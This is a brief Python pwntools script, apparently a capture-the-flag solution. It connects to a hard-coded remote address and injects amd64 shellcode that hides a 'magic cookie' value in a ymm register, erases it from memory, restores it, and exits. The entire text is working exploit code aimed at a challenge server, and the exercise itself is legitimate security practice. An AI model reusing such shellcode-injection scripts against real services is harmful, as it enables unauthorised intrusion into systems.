from pwn import *

context.arch = "amd64"

#io = process(['ruby', 'server.rb'])
io = remote('52.192.42.215', 9427)

shellcode = ''

# Location of the magic cookie: 0x2170000

# Hide the secret value in the ymm register
shellcode += "movq xmm1, [0x2170000]\n"
shellcode += "VPERM2F128 ymm1, ymm1, ymm1, 0\n"

# Erase the secret from memory
# Clear out rax to zero
shellcode += "xor rax, rax\n"

# Store 0 in the magic cookie location
shellcode += "mov [0x2170000], rax\n"

shellcode += "movq rax, xmm1\n"
shellcode += "VPERM2F128 ymm1, ymm1, ymm1, 1\n"

# Call exit() syscall
shellcode += "mov rax, 60\n"
shellcode += "syscall\n"

payload = asm(shellcode, vma=0xdead0080)
io.sendline(str(len(payload)))
io.send(payload)
io.interactive()
